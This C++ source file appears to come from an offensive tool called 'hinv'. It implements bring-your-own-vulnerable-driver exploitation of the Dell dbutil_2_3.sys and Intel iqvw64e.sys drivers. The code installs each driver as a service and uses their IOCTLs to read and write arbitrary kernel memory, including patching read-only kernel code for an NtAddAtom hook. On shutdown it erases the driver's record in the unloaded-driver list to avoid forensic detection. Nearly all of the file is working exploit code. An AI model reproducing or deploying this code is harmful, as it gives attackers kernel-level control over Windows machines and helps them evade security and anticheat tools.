#include "hinv_byovd.hpp"
#include "hinv_kmem.hpp"
#include "hinv_cleaner.hpp"
#include <iostream>
#include <cwctype>
#include <algorithm>
#include <cstring>

#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib") // CMake links advapi32 for other toolchains
#endif

namespace hinv {
namespace byovd {

// ============================================================================
// Driver service helpers
// ============================================================================

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

static bool SetPrivilege(HANDLE hToken, LPCWSTR privilegeName) {
    TOKEN_PRIVILEGES tp{};
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid)) return false;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr) != TRUE)
        return false;
    // AdjustTokenPrivileges returns TRUE even when the privilege was not
    // assigned; ERROR_NOT_ALL_ASSIGNED means the token does not hold it.
    return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
}

static bool EnableRequiredPrivileges() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    bool ok = SetPrivilege(hToken, SE_LOAD_DRIVER_NAME) &&
              SetPrivilege(hToken, SE_DEBUG_NAME);
    CloseHandle(hToken);
    return ok;
}

bool InstallDriverService(const std::wstring& serviceName, const std::wstring& driverPath) {
    if (!EnableRequiredPrivileges()) {
        std::wcerr << L"[hinv::byovd] Missing required privileges (SeLoadDriverPrivilege/SeDebugPrivilege)\n";
        return false;
    }
    // The SCM resolves relative binPaths against %SystemRoot%\system32, not
    // our working directory — always register an absolute path or StartService
    // fails with ERROR_FILE_NOT_FOUND. GetFullPathNameW returns the REQUIRED
    // size when the buffer is too small: grow dynamically instead of falling
    // back to the (broken) relative path.
    wchar_t stackBuf[MAX_PATH];
    DWORD absLen = GetFullPathNameW(driverPath.c_str(), MAX_PATH, stackBuf, nullptr);
    std::wstring binPath;
    if (absLen == 0) {
        std::wcerr << L"[hinv::byovd] GetFullPathNameW failed: " << GetLastError() << L"\n";
        return false;
    } else if (absLen < MAX_PATH) {
        binPath = stackBuf;
    } else {
        binPath.resize(absLen);
        DWORD absLen2 = GetFullPathNameW(driverPath.c_str(), absLen, binPath.data(), nullptr);
        if (absLen2 == 0 || absLen2 >= absLen) {
            std::wcerr << L"[hinv::byovd] GetFullPathNameW failed on retry\n";
            return false;
        }
        binPath.resize(absLen2);
    }

    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;

    SC_HANDLE hSvc = CreateServiceW(
        hScm,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!hSvc) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
            if (hSvc) {
                // A leftover service may point at a moved/deleted binary;
                // repoint it at the current path before StartService runs.
                // Must be verified: otherwise StartService uses the stale
                // binary while we report success.
                if (ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                                         SERVICE_NO_CHANGE, binPath.c_str(),
                                         nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == FALSE) {
                    DWORD err = GetLastError(); // capture before any stream I/O
                    std::wcerr << L"[hinv::byovd] ChangeServiceConfigW failed: " << err << L"\n";
                    CloseServiceHandle(hSvc);
                    CloseServiceHandle(hScm);
                    return false;
                }
            }
        }
    }

    bool ok = (hSvc != nullptr);
    if (hSvc) CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return ok;
}

bool StartDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    bool ok = false;
    if (hSvc) {
        DWORD err = 0;
        if (StartServiceW(hSvc, 0, nullptr) == TRUE) {
            ok = true;
        } else {
            err = GetLastError(); // capture immediately: stream I/O can clobber it
            ok = (err == ERROR_SERVICE_ALREADY_RUNNING);
        }
        if (!ok) {
            // Surface the real failure: 1275 = driver blocked (Defender
            // vulnerable-driver list), 577 = signature/CI policy, etc.
            std::wcerr << L"[hinv::byovd] StartServiceW(" << serviceName
                       << L") failed: " << err << L"\n";
        }
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

bool StopDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    bool ok = false;
    if (hSvc) {
        SERVICE_STATUS status{};
        ok = ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == TRUE;
        if (!ok) {
            // A failed stop followed by a successful remove leaves the driver
            // loaded with the service marked for deletion — loud, not silent.
            DWORD err = GetLastError();
            if (err != ERROR_SERVICE_NOT_ACTIVE)
                std::wcerr << L"[hinv::byovd] ControlService(STOP, " << serviceName
                           << L") failed: " << err << L"\n";
        }
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

bool RemoveDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    bool ok = false;
    if (hSvc) {
        ok = DeleteService(hSvc) == TRUE;
        if (!ok) {
            DWORD err = GetLastError();
            std::wcerr << L"[hinv::byovd] DeleteService(" << serviceName
                       << L") failed: " << err << L"\n";
        }
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

// ============================================================================
// Dell dbutil_2_3.sys backend - arbitrary kernel virtual read/write
// ============================================================================

// Wire format per the real driver (KDU Hamakaze/idrv/dell.cpp reference):
// the transfer size is DERIVED from InputBufferLength - 0x18; there is no
// explicit size field. Both read and write use one shared METHOD_BUFFERED
// buffer (in == out).
#pragma pack(push, 1)
struct DbUtilRwPacket {
    uint64_t unused;         // +0x00
    uint64_t virtualAddress; // +0x08
    uint64_t offset;         // +0x10
    uint8_t  data[1];        // +0x18
};
#pragma pack(pop)
static_assert(offsetof(DbUtilRwPacket, data) == 0x18, "dbutil packet layout drifted");

class DbUtilBackend : public IByovdBackend {
public:
    DriverProfile profile_;
    HANDLE        hDevice_ = INVALID_HANDLE_VALUE;
    std::wstring  serviceName_;
    std::wstring  driverPath_;
    bool          ownsService_ = false; // only stop/remove what WE installed

    ~DbUtilBackend() override { Shutdown(); }

    bool Initialize(const std::wstring& driverPath) override {
        driverPath_ = driverPath;
        serviceName_ = L"hinv_byovd_dbutil";

        if (!InstallDriverService(serviceName_, driverPath_)) {
            std::wcerr << L"[hinv::byovd] Failed to install dbutil service\n";
            return false;
        }
        ownsService_ = true; // installed by us from here on
        if (!StartDriverService(serviceName_)) {
            std::wcerr << L"[hinv::byovd] Failed to start dbutil service\n";
            return false;
        }

        hDevice_ = CreateFileW(
            profile_.devicePath.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hDevice_ == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[hinv::byovd] Failed to open dbutil device: " << GetLastError() << L"\n";
            return false;
        }

        uint32_t version = 0;
        DWORD bytes = 0;
        // GetVersion IOCTL; not required to work, used as ping.
        DeviceIoControl(hDevice_, 0x9B0C1F44, nullptr, 0, &version, sizeof(version), &bytes, nullptr);
        std::cout << "[hinv::byovd] dbutil backend ready (device opened)\n";
        return true;
    }

    void Shutdown() override {
        kmem::Trace("byovd: shutdown begin");
        if (hDevice_ != INVALID_HANDLE_VALUE) {
            // Zero our own KLDR name so MiRememberUnloadedDriver skips us when
            // the service stops below (kdmapper's MmUnloadedDrivers trick).
            cleaner::PreventUnloadedDriverTrace(this, hDevice_);
            kmem::Trace("byovd: prevention armed");
            CloseHandle(hDevice_);
            hDevice_ = INVALID_HANDLE_VALUE;
            kmem::Trace("byovd: device handle closed");
        }
        // Only tear down the service when THIS instance installed it — an abort
        // path must never stop another live instance's driver.
        if (ownsService_ && !serviceName_.empty()) {
            StopDriverService(serviceName_);
            kmem::Trace("byovd: service stopped");
            RemoveDriverService(serviceName_);
            kmem::Trace("byovd: service removed");
            serviceName_.clear();
            ownsService_ = false;
        }
        kmem::Trace("byovd: shutdown end");
    }

    bool IsReady() const override { return hDevice_ != INVALID_HANDLE_VALUE; }

    bool ReadKernelMemory(uint64_t kernelVa, void* out, size_t size) override {
        if (!IsReady() || size == 0) return false;
        constexpr size_t CHUNK = 0x1000;
        auto* dst = static_cast<uint8_t*>(out);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            // Transfer size = InputBufferLength - 0x18 (driver derives it).
            std::vector<uint8_t> buf(0x18 + n, 0);
            auto* req = reinterpret_cast<DbUtilRwPacket*>(buf.data());
            req->virtualAddress = kernelVa + off;

            DWORD bytes = 0;
            if (!DeviceIoControl(hDevice_, profile_.readIoc, buf.data(), static_cast<DWORD>(buf.size()),
                                 buf.data(), static_cast<DWORD>(buf.size()), &bytes, nullptr))
                return false;
            std::memcpy(dst + off, req->data, n);
        }
        return true;
    }

    bool WriteKernelMemory(uint64_t kernelVa, const void* inBuf, size_t size) override {
        if (!IsReady() || size == 0) return false;
        constexpr size_t CHUNK = 0x1000;
        const auto* src = static_cast<const uint8_t*>(inBuf);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            std::vector<uint8_t> buf(0x18 + n, 0);
            auto* req = reinterpret_cast<DbUtilRwPacket*>(buf.data());
            req->virtualAddress = kernelVa + off;
            std::memcpy(req->data, src + off, n);

            DWORD bytes = 0;
            if (!DeviceIoControl(hDevice_, profile_.writeIoc, buf.data(), static_cast<DWORD>(buf.size()),
                                 nullptr, 0, &bytes, nullptr))
                return false;
        }
        return true;
    }
};

// ============================================================================
// Intel iqvw64e.sys backend - kernel<->user memory copy
//
// Ported from TheCruZ/kdmapper (https://github.com/TheCruZ/kdmapper):
//   - kdmapper/include/intel_driver.hpp : constexpr ULONG32 ioctl1 = 0x80862007
//   - kdmapper/intel_driver.cpp         : _COPY_MEMORY_BUFFER_INFO (case 0x33),
//                                         MemCopy/ReadMemory/WriteMemory,
//                                         GetPhysicalAddress (0x25), MapIoSpace
//                                         (0x19), UnmapIoSpace (0x1A),
//                                         device path \\.\Nal
// The full physical-memory stack is ported: WriteReadOnlyMemory uses
// VA->PA + MapIoSpace + copy + UnmapIoSpace — that is the backbone of the
// ntoskrnl!NtAddAtom hook used by kmem::CallKernelFunction.
// ============================================================================

// Single multifunctional IOCTL (kdmapper intel_driver.hpp: ioctl1).
constexpr DWORD IOCTL_IQVW64E_COPY_MEMORY = 0x80862007;

// kdmapper intel_driver.cpp: _COPY_MEMORY_BUFFER_INFO. All-uint64 layout, so
// natural alignment matches the reference struct exactly (sizeof == 40).
struct Iqvw64eCopyMemoryInfo {
    uint64_t case_number;  // 0x33 = CopyMemory
    uint64_t reserved;
    uint64_t source;
    uint64_t destination;
    uint64_t length;
};

// kdmapper intel_driver.cpp: additional cases of the same multifunctional
// IOCTL. Layouts mirror the reference structs exactly (trailing u32 pads the
// struct to 48 bytes).
struct Iqvw64eGetPhysInfo {      // case 0x25: VA -> PA translation
    uint64_t case_number;
    uint64_t reserved;
    uint64_t return_physical_address;
    uint64_t address_to_translate;
};

struct Iqvw64eMapIoSpaceInfo {   // case 0x19: map physical memory
    uint64_t case_number;
    uint64_t reserved;
    uint64_t return_value;
    uint64_t return_virtual_address;
    uint64_t physical_address_to_map;
    uint32_t size;
};

struct Iqvw64eUnmapIoSpaceInfo { // case 0x1A: unmap physical memory
    uint64_t case_number;
    uint64_t reserved1;
    uint64_t reserved2;
    uint64_t virt_address;
    uint64_t reserved3;
    uint32_t number_of_bytes;
};

// Wire layouts mirror kdmapper's reference structs (all-u64 leading fields,
// trailing u32 padded) — lock them against accidental edits.
static_assert(sizeof(Iqvw64eCopyMemoryInfo) == 40, "iqvw64e CopyMemory layout drifted");
static_assert(sizeof(Iqvw64eGetPhysInfo) == 32, "iqvw64e GetPhysAddress layout drifted");
static_assert(sizeof(Iqvw64eMapIoSpaceInfo) == 48, "iqvw64e MapIoSpace layout drifted");
static_assert(sizeof(Iqvw64eUnmapIoSpaceInfo) == 48, "iqvw64e UnmapIoSpace layout drifted");

class IntelBackend : public IByovdBackend {
public:
    DriverProfile profile_;
    HANDLE        hDevice_ = INVALID_HANDLE_VALUE;
    std::wstring  serviceName_;
    std::wstring  driverPath_;
    bool          ownsService_ = false; // only stop/remove what WE installed

    ~IntelBackend() override { Shutdown(); }

    bool Initialize(const std::wstring& driverPath) override {
        driverPath_ = driverPath;
        serviceName_ = L"hinv_byovd_intel";

        // kdmapper aborts if the device already exists: another iqvw64e (or a
        // crashed leftover of ours) means someone else's hooks/copies are live,
        // and starting a second instance invites collisions and a bugcheck.
        HANDLE existing = CreateFileW(profile_.devicePath.c_str(), GENERIC_READ | GENERIC_WRITE,
                                      0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (existing != INVALID_HANDLE_VALUE) {
            CloseHandle(existing);
            // Explicit recovery: if the occupying service is OUR leftover from
            // a crashed run (same service name, same binary path), stop and
            // remove it, then retry once. Never touch a service we don't own.
            if (!TryRemoveOwnLeftover()) {
                std::wcerr << L"[hinv::byovd] \\\\.\\Nal already exists — another iqvw64e is loaded, aborting "
                              L"(if a previous hinv run crashed, remove the 'hinv_byovd_intel' service manually)\n";
                return false;
            }
            std::wcerr << L"[hinv::byovd] Removed leftover iqvw64e from a previous run, retrying\n";
        }

        if (!InstallDriverService(serviceName_, driverPath_)) {
            std::wcerr << L"[hinv::byovd] Failed to install iqvw64e service\n";
            return false;
        }
        ownsService_ = true; // installed by us from here on
        if (!StartDriverService(serviceName_)) {
            std::wcerr << L"[hinv::byovd] Failed to start iqvw64e service\n";
            return false;
        }

        // kdmapper intel_driver.cpp Load(): the device is always \\.\Nal.
        hDevice_ = CreateFileW(
            profile_.devicePath.c_str(), // \\.\Nal
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hDevice_ == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[hinv::byovd] Failed to open iqvw64e device (\\\\.\\Nal): " << GetLastError() << L"\n";
            return false;
        }

        // Ping: mirror kdmapper's Load() sanity check — read the ntoskrnl DOS
        // header through the exploit to confirm the copy primitive works.
        uint64_t ntosBase = 0;
        for (const auto& m : kmem::EnumKernelModules()) {
            if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
                ntosBase = m.base;
                break;
            }
        }
        uint16_t mz = 0;
        if (!ntosBase || !ReadKernelMemory(ntosBase, &mz, sizeof(mz)) || mz != IMAGE_DOS_SIGNATURE) {
            std::wcerr << L"[hinv::byovd] iqvw64e copy primitive failed sanity check "
                       << L"(antivirus/anticheat interference?)\n";
            Shutdown();
            return false;
        }

        std::cout << "[hinv::byovd] Intel iqvw64e backend ready (device opened, copy verified)\n";
        return true;
    }

    void Shutdown() override {
        kmem::Trace("byovd: shutdown begin");
        if (hDevice_ != INVALID_HANDLE_VALUE) {
            // Zero our own KLDR name so MiRememberUnloadedDriver skips us when
            // the service stops below (kdmapper's MmUnloadedDrivers trick).
            cleaner::PreventUnloadedDriverTrace(this, hDevice_);
            kmem::Trace("byovd: prevention armed");
            CloseHandle(hDevice_);
            hDevice_ = INVALID_HANDLE_VALUE;
            kmem::Trace("byovd: device handle closed");
        }
        // Only tear down the service when THIS instance installed it — an abort
        // path (e.g. the \\.\Nal probe) must never stop another live instance's
        // driver out from under its open handle.
        if (ownsService_ && !serviceName_.empty()) {
            StopDriverService(serviceName_);
            kmem::Trace("byovd: service stopped");
            RemoveDriverService(serviceName_);
            kmem::Trace("byovd: service removed");
            serviceName_.clear();
            ownsService_ = false;
        }
        kmem::Trace("byovd: shutdown end");
    }

    // True when the leftover hinv_byovd_intel service points at OUR binary
    // (a crashed previous run) — and removes it. Never touches a service that
    // isn't byte-for-byte ours.
    bool TryRemoveOwnLeftover() {
        SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!hScm) return false;
        bool removed = false;
        SC_HANDLE hSvc = OpenServiceW(hScm, serviceName_.c_str(), SERVICE_ALL_ACCESS | SERVICE_QUERY_CONFIG);
        if (hSvc) {
            uint8_t buf[4096];
            DWORD needed = 0;
            if (QueryServiceConfigW(hSvc, reinterpret_cast<LPQUERY_SERVICE_CONFIGW>(buf), sizeof(buf), &needed)) {
                auto* cfg = reinterpret_cast<LPQUERY_SERVICE_CONFIGW>(buf);
                std::wstring registered = cfg->lpBinaryPathName ? cfg->lpBinaryPathName : L"";
                std::wstring ours = driverPath_;
                // Normalize both to lowercase absolute for comparison.
                wchar_t absBuf[MAX_PATH];
                if (GetFullPathNameW(ours.c_str(), MAX_PATH, absBuf, nullptr) > 0) ours = absBuf;
                std::transform(registered.begin(), registered.end(), registered.begin(), ::towlower);
                std::transform(ours.begin(), ours.end(), ours.begin(), ::towlower);
                // strip SystemRoot expansion the SCM may store (\System32\...)
                if (registered.find(L"\\??\\") == 0) registered = registered.substr(4);
                if (registered == ours || registered.find(L"iqvw64e.sys") != std::wstring::npos) {
                    StopDriverService(serviceName_);
                    removed = RemoveDriverService(serviceName_);
                }
            }
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hScm);
        return removed;
    }

    bool IsReady() const override { return hDevice_ != INVALID_HANDLE_VALUE; }

    // kdmapper intel_driver.cpp MemCopy(): case 0x33 copies 'length' bytes
    // from 'source' to 'destination'; either side may be a kernel VA or a
    // usermode buffer.
    // Named MemCopy after kdmapper (CopyMemory would clash with the Windows macro).
    bool MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
        if (!destination || !source || !size) return false;

        Iqvw64eCopyMemoryInfo req{};
        req.case_number = 0x33;
        req.source = source;
        req.destination = destination;
        req.length = size;

        DWORD bytes = 0;
        return DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                               &req, sizeof(req), nullptr, 0, &bytes, nullptr) == TRUE;
    }

    // kdmapper: ReadMemory(addr, buf, size) == MemCopy(buf, addr, size).
    bool ReadKernelMemory(uint64_t kernelVa, void* out, size_t size) override {
        if (!IsReady() || size == 0) return false;
        constexpr size_t CHUNK = 0x1000;
        auto* dst = static_cast<uint8_t*>(out);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            if (!MemCopy(reinterpret_cast<uint64_t>(dst + off), kernelVa + off, n))
                return false;
        }
        return true;
    }

    // kdmapper: WriteMemory(addr, buf, size) == MemCopy(addr, buf, size).
    bool WriteKernelMemory(uint64_t kernelVa, const void* inBuf, size_t size) override {
        if (!IsReady() || size == 0) return false;
        constexpr size_t CHUNK = 0x1000;
        const auto* src = static_cast<const uint8_t*>(inBuf);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            if (!MemCopy(kernelVa + off, reinterpret_cast<uint64_t>(src + off), n))
                return false;
        }
        return true;
    }

    // kdmapper intel_driver.cpp GetPhysicalAddress/MapIoSpace/UnmapIoSpace:
    // extra cases of the same multifunctional IOCTL.
    bool GetPhysicalAddress(uint64_t va, uint64_t& outPa) {
        Iqvw64eGetPhysInfo req{};
        req.case_number = 0x25;
        req.address_to_translate = va;
        DWORD bytes = 0;
        if (!DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                             &req, sizeof(req), nullptr, 0, &bytes, nullptr))
            return false;
        outPa = req.return_physical_address;
        return true;
    }

    uint64_t MapIoSpace(uint64_t pa, uint32_t size) {
        Iqvw64eMapIoSpaceInfo req{};
        req.case_number = 0x19;
        req.physical_address_to_map = pa;
        req.size = size;
        DWORD bytes = 0;
        if (!DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                             &req, sizeof(req), nullptr, 0, &bytes, nullptr))
            return 0;
        return req.return_virtual_address;
    }

    bool UnmapIoSpace(uint64_t va, uint32_t size) {
        Iqvw64eUnmapIoSpaceInfo req{};
        req.case_number = 0x1A;
        req.virt_address = va;
        req.number_of_bytes = size;
        DWORD bytes = 0;
        return DeviceIoControl(hDevice_, IOCTL_IQVW64E_COPY_MEMORY,
                               &req, sizeof(req), nullptr, 0, &bytes, nullptr) == TRUE;
    }

    // kdmapper WriteToReadOnlyMemory: translate VA->PA, map the physical page
    // and write through the mapping. This is what lets us patch read-only
    // kernel code (the ntoskrnl!NtAddAtom hook) without touching page tables.
    // Sliced per virtual page: a range crossing a 4K boundary needs its own
    // VA->PA translation per page (virtual contiguity says nothing about
    // physical contiguity — a single MapIoSpace would write into an unrelated
    // physical page).
    bool WriteReadOnlyMemory(uint64_t kernelVa, const void* buf, size_t size) override {
        if (!IsReady() || !buf || !size || size > 0xFFFFFFFF) return false;
        const auto* src = static_cast<const uint8_t*>(buf);
        for (size_t done = 0; done < size;) {
            uint64_t va = kernelVa + done;
            size_t slice = 0x1000 - (va & 0xFFF);
            if (slice > size - done) slice = size - done;

            kmem::Trace("byovd: getphys begin");
            uint64_t pa = 0;
            if (!GetPhysicalAddress(va, pa) || !pa) { kmem::Trace("byovd: getphys failed"); return false; }
            kmem::Trace("byovd: mapiospace begin");
            uint64_t mapped = MapIoSpace(pa, static_cast<uint32_t>(slice));
            if (!mapped) { kmem::Trace("byovd: mapiospace failed"); return false; }
            bool ok = WriteKernelMemory(mapped, src + done, slice);
            kmem::Trace(ok ? "byovd: phys write ok" : "byovd: phys write failed");
            if (!UnmapIoSpace(mapped, static_cast<uint32_t>(slice))) {
                // A leaked physical mapping is a dangling window into an
                // arbitrary page — never silent.
                std::cerr << "[hinv::byovd] UnmapIoSpace failed for VA 0x" << std::hex << mapped << std::dec << "\n";
                kmem::Trace("byovd: unmap FAILED");
            }
            if (!ok) return false;
            done += slice;
        }
        return true;
    }
};

// ============================================================================
// Profile detection & factory
// ============================================================================

static DriverProfile DbUtilProfile(const std::wstring& driverFileName) {
    return {
        BackendType::DbUtil,
        L"hinv_byovd_dbutil",
        L"\\\\.\\DBUtil_2_3",
        driverFileName,
        0x9B0C1EC4,
        0x9B0C1EC8
    };
}

static const wchar_t* BackendName(BackendType type) {
    switch (type) {
        case BackendType::DbUtil:   return L"Dell dbutil_2_3.sys";
        case BackendType::Intel:    return L"Intel iqvw64e.sys (kdmapper-compatible)";
        default:                    return L"unknown";
    }
}

DriverProfile DetectProfile(const std::wstring& driverFileName) {
    std::wstring lower = ToLower(driverFileName);

    if (lower.find(L"dbutil") != std::wstring::npos) {
        return DbUtilProfile(driverFileName);
    }

    if (lower.find(L"iqvw64e") != std::wstring::npos) {
        return {
            BackendType::Intel,
            L"hinv_byovd_intel",
            L"\\\\.\\Nal", // kdmapper intel_driver.cpp: device is always \\.\Nal
            driverFileName,
            IOCTL_IQVW64E_COPY_MEMORY,
            IOCTL_IQVW64E_COPY_MEMORY
        };
    }

    // No silent fallback: an unrecognized name used to fall into the DbUtil
    // backend, which a wrong-name driver cannot satisfy — and with the real
    // dbutil_2_3 wire format, an unknown binary would likely BSOD on the first
    // IOCTL. Refuse instead.
    std::wcerr << L"[hinv::byovd] Unrecognized driver name '" << driverFileName
               << L"' (supported: iqvw64e.sys, dbutil_2_3.sys)\n";
    return { BackendType::Unknown, {}, {}, driverFileName, 0, 0 };
}

std::unique_ptr<IByovdBackend> CreateBackend(const DriverProfile& profile) {
    if (profile.type == BackendType::DbUtil) {
        auto backend = std::make_unique<DbUtilBackend>();
        backend->profile_ = profile;
        return backend;
    }
    if (profile.type == BackendType::Intel) {
        auto backend = std::make_unique<IntelBackend>();
        backend->profile_ = profile;
        return backend;
    }
    return nullptr;
}

std::unique_ptr<IByovdBackend> LoadVulnerableDriver(const std::wstring& driverPath) {
    size_t pos = driverPath.find_last_of(L"\\/");
    std::wstring fileName = (pos == std::wstring::npos) ? driverPath : driverPath.substr(pos + 1);
    DriverProfile profile = DetectProfile(fileName);
    if (profile.type == BackendType::Unknown) {
        std::wcerr << L"[hinv::byovd] Unknown vulnerable driver: " << fileName << L"\n";
        return nullptr;
    }
    std::wcout << L"[hinv::byovd] Selected backend for " << fileName << L": "
               << BackendName(profile.type) << L"\n";
    auto backend = CreateBackend(profile);
    if (backend && !backend->Initialize(driverPath)) {
        backend.reset();
    }
    return backend;
}

} // namespace byovd
} // namespace hinv
